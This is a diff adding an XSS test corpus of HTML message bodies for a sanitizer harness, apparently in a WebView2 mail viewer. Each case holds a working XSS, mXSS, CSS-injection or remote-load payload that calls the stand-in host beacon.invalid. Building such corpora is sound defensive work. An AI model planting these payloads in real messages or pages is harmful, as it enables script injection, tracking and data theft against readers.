@@ -1,0 +1,91 @@
+<!-- T19 XSS corpus (BUILD.md section 15). Each case starts with a "case:" comment line. Every payload
+that ran, loaded or navigated would reach http://beacon.invalid/<case>, so the WebView2 harness counts
+any request to that host as a failure (SPEC_GAPS G56). Cases are HTML message bodies. -->
+<!-- case: script -->
+<p>hello</p><script>fetch('http://beacon.invalid/script')</script>
+<!-- case: script-src -->
+<script src="http://beacon.invalid/script-src.js"></script>
+<!-- case: script-split -->
+<scr<script>ipt>fetch('http://beacon.invalid/script-split')</scr</script>ipt>
+<!-- case: img-onerror -->
+<img src="x" onerror="fetch('http://beacon.invalid/img-onerror')">
+<!-- case: body-onload -->
+<body onload="fetch('http://beacon.invalid/body-onload')"><p>x</p></body>
+<!-- case: div-onmouseover -->
+<div onmouseover="fetch('http://beacon.invalid/mouseover')" style="height:300px">hover</div>
+<!-- case: details-ontoggle -->
+<details open ontoggle="fetch('http://beacon.invalid/ontoggle')"><summary>s</summary>t</details>
+<!-- case: marquee-onstart -->
+<marquee onstart="fetch('http://beacon.invalid/marquee')">m</marquee>
+<!-- case: javascript-href -->
+<a href="javascript:fetch('http://beacon.invalid/js-href')">click</a>
+<!-- case: javascript-href-obfuscated -->
+<a href="JaVaScRiPt:fetch('http://beacon.invalid/js-href-case')">a</a><a href="&#106;avascript:fetch('http://beacon.invalid/js-href-entity')">b</a><a href=" java&#x09;script:fetch('http://beacon.invalid/js-href-tab')">c</a>
+<!-- case: vbscript-href -->
+<a href="vbscript:msgbox('x')">vb</a>
+<!-- case: data-href -->
+<a href="data:text/html,&lt;script&gt;fetch('http://beacon.invalid/data-href')&lt;/script&gt;">d</a>
+<!-- case: iframe-javascript -->
+<iframe src="javascript:fetch('http://beacon.invalid/iframe-js')"></iframe>
+<!-- case: iframe-srcdoc -->
+<iframe srcdoc="&lt;script&gt;fetch('http://beacon.invalid/srcdoc')&lt;/script&gt;"></iframe>
+<!-- case: frameset -->
+<frameset><frame src="http://beacon.invalid/frame"></frameset>
+<!-- case: svg-onload -->
+<svg onload="fetch('http://beacon.invalid/svg-onload')"><script>fetch('http://beacon.invalid/svg-script')</script></svg>
+<!-- case: svg-animate -->
+<svg><a><animate attributeName="href" values="javascript:fetch('http://beacon.invalid/svg-animate')"/><text y="20">x</text></a></svg>
+<!-- case: svg-image -->
+<svg><image href="http://beacon.invalid/svg-image.png"/><use href="http://beacon.invalid/svg-use.svg#x"/></svg>
+<!-- case: math-mxss -->
+<math><mtext><table><mglyph><style><img src=x onerror="fetch('http://beacon.invalid/mxss')"></style></mglyph></table></mtext></math>
+<!-- case: noscript-mxss -->
+<noscript><p title="</noscript><img src=x onerror=fetch('http://beacon.invalid/noscript')>"></p></noscript>
+<!-- case: template -->
+<template><script>fetch('http://beacon.invalid/template')</script></template>
+<!-- case: css-import -->
+<style>@import 'http://beacon.invalid/import.css'; @import url("http://beacon.invalid/import2.css");</style>
+<!-- case: css-import-escaped -->
+<style>@\69mport url(http://beacon.invalid/import-escaped.css);</style>
+<!-- case: css-background -->
+<style>body{background:url(http://beacon.invalid/css-bg.png)}</style><div style="background-image:url('http://beacon.invalid/inline-bg.png')">x</div>
+<!-- case: css-escaped-url -->
+<div style="background:\75rl(http://beacon.invalid/escaped-url.png)">x</div>
+<!-- case: css-font-face -->
+<style>@font-face{font-family:x;src:url(http://beacon.invalid/font.woff)}p{font-family:x}</style><p>font</p>
+<!-- case: css-image-set -->
+<div style="background-image:image-set('http://beacon.invalid/image-set.png' 1x)">x</div>
+<!-- case: css-expression -->
+<div style="width:expression(fetch('http://beacon.invalid/expression'))">x</div>
+<!-- case: css-javascript-url -->
+<div style="background:url(&quot;javascript:fetch('http://beacon.invalid/css-js')&quot;)">x</div>
+<!-- case: meta-refresh -->
+<meta http-equiv="refresh" content="0;url=http://beacon.invalid/refresh">
+<!-- case: meta-refresh-javascript -->
+<meta http-equiv="refresh" content="0;url=javascript:fetch('http://beacon.invalid/refresh-js')">
+<!-- case: form -->
+<form action="http://beacon.invalid/form" method="post"><input name="a" value="x" autofocus onfocus="fetch('http://beacon.invalid/onfocus')"><button formaction="http://beacon.invalid/formaction">go</button><textarea>t</textarea><select><option>o</option></select></form>
+<!-- case: input-image -->
+<input type="image" src="http://beacon.invalid/input-image.png">
+<!-- case: base -->
+<base href="http://beacon.invalid/base/"><img src="relative.png"><a href="relative">r</a>
+<!-- case: link-stylesheet -->
+<link rel="stylesheet" href="http://beacon.invalid/link.css"><link rel="prefetch" href="http://beacon.invalid/prefetch">
+<!-- case: object-embed-applet -->
+<object data="http://beacon.invalid/object"></object><embed src="http://beacon.invalid/embed"><applet code="x" codebase="http://beacon.invalid/applet"></applet>
+<!-- case: media -->
+<video poster="http://beacon.invalid/poster.png" src="http://beacon.invalid/video.mp4"></video><audio src="http://beacon.invalid/audio.mp3" autoplay></audio>
+<!-- case: tracking-pixel -->
+<p>Newsletter</p><img src="http://beacon.invalid/pixel.gif?id=123" width="1" height="1">
+<!-- case: srcset -->
+<img srcset="http://beacon.invalid/srcset.png 1x" src="cid:inline@x">
+<!-- case: table-background -->
+<table background="http://beacon.invalid/table-bg.png"><tr><td background="javascript:fetch('http://beacon.invalid/td-js')">t</td></tr></table>
+<!-- case: conditional-comment -->
+<!--[if gte mso 9]><script>fetch('http://beacon.invalid/conditional')</script><![endif]--><p>c</p>
+<!-- case: data-image-svg -->
+<img src="data:image/svg+xml,&lt;svg xmlns='http://www.w3.org/2000/svg' onload='fetch(&quot;http://beacon.invalid/data-svg&quot;)'/&gt;">
+<!-- case: id-clobbering -->
+<form id="parent"><img name="postMessage" id="ResizeObserver"></form><a id="addEventListener">x</a>
+<!-- case: target-blank -->
+<a href="http://beacon.invalid/link-click" target="_blank" ping="http://beacon.invalid/ping">only on click</a>
